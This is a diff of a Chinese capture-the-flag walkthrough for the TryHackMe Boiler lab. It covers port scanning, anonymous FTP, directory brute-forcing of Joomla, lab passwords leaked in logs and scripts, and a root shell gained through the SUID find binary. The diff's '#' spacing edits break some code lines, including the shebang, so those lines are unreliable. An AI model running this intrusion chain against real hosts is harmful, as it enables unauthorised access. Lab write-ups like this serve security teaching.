@@ -1,7 +1,7 @@
-#服务发现
+# 服务发现
 ```
 ┌──(root💀kali)-[~/tryhackme/boilerctf]
-└─# nmap -sV -Pn 10.10.109.157 -p-
+└─#  nmap -sV -Pn 10.10.109.157 -p-
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-30 02:04 EDT
 Nmap scan report for 10.10.109.157
@@ -19,13 +19,13 @@ Nmap done: 1 IP address (1 host up) scanned in 892.53 seconds
 
 ```
 
-#服务分析
+# 服务分析
 开启了ftp服务，此版本没有比较出名的漏洞
 可以匿名登录
 有一个隐藏文件```.info.txt```下载到本地待分析
 ```
 ┌──(root💀kali)-[~/tryhackme/boilerctf]
-└─# ftp 10.10.109.157
+└─#  ftp 10.10.109.157
 Connected to 10.10.109.157.
 220 (vsFTPd 3.0.3)
 Name (10.10.109.157:root): anonymous
@@ -57,7 +57,7 @@ ftp> bye
 文件内容应该是某种加密算法的密文：
 ```
 ┌──(root💀kali)-[~/tryhackme/boilerctf]
-└─# cat .info.txt 
+└─#  cat .info.txt 
 Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
 
 ```
@@ -72,10 +72,10 @@ Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
 
 80端口是一个http服务，首页是一个apache首页
 
-#目录爆破
+# 目录爆破
 ```
 ──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -u http://10.10.109.157
+└─#  python3 dirsearch.py -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -u http://10.10.109.157
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -99,7 +99,7 @@ manual/是apache文档
 继续爆破joomla/
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -u http://10.10.109.157/joomla
+└─#  python3 dirsearch.py -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -u http://10.10.109.157/joomla
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -148,10 +148,10 @@ Target: http://10.10.109.157/joomla
 
 文件：```unit-tests.sh```
 ```
-#!/bin/bash
-# Script for preparing the unit tests in Joomla!
+# !/bin/bash
+#  Script for preparing the unit tests in Joomla!
 
-# Path to the Joomla! installation
+#  Path to the Joomla! installation
 BASE="/opt/src"
 
 until mysqladmin ping -h mysql --silent; do
@@ -166,7 +166,7 @@ done
 
 >&2 echo "Postgres alive!"
 
-# Setup databases for testing
+#  Setup databases for testing
 mysql -u root joomla_ut -h mysql -pjoomla_ut < "$BASE/tests/unit/schema/mysql.sql"
 psql -c 'create database joomla_ut;'  -U postgres -h "postgres" > /dev/null
 psql -U "postgres" -h "postgres" -d joomla_ut -a -f "$BASE/tests/unit/schema/postgresql.sql" > /dev/null
@@ -239,7 +239,7 @@ services:
 ```
 Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
 Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
-Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
+Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 # pass: superduperp@$$
 Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
 Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
 Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
@@ -265,7 +265,7 @@ LOG=/home/stoner/bck.log
 DATE=`date +%y\.%m\.%d\.`
 
 USER=stoner
-#superduperp@$$no1knows
+# superduperp@$$no1knows
 
 ssh $USER@$REMOTE mkdir $TARGET/$DATE
 
@@ -279,7 +279,7 @@ if [ -d "$SOURCE" ]; then
                 if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
                     rm $SOURCE/$i
                     echo $i "removed" >> $LOG
-                    echo "####################" >> $LOG
+                    echo "# # # # # # # # # # # # # # # # # # # # " >> $LOG
                                 else
                                         echo "Copy not complete" >> $LOG
                                         exit 0
@@ -320,16 +320,16 @@ You made it till here, well done.
 发现一个可以用于提权的SUID：```find```
 ```
 stoner@Vulnerable:~$ /usr/bin/find . -exec /bin/sh -p \; -quit
-# id
+#  id
 uid=1000(stoner) gid=1000(stoner) euid=0(root) groups=1000(stoner),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
-# whoami
+#  whoami
 root
-# cd /root
-# ls
+#  cd /root
+#  ls
 root.txt
-# cat root.txt
+#  cat root.txt
 It wasn't that hard, was it?
-# 
+#  
 
 ```
 拿到 root flag
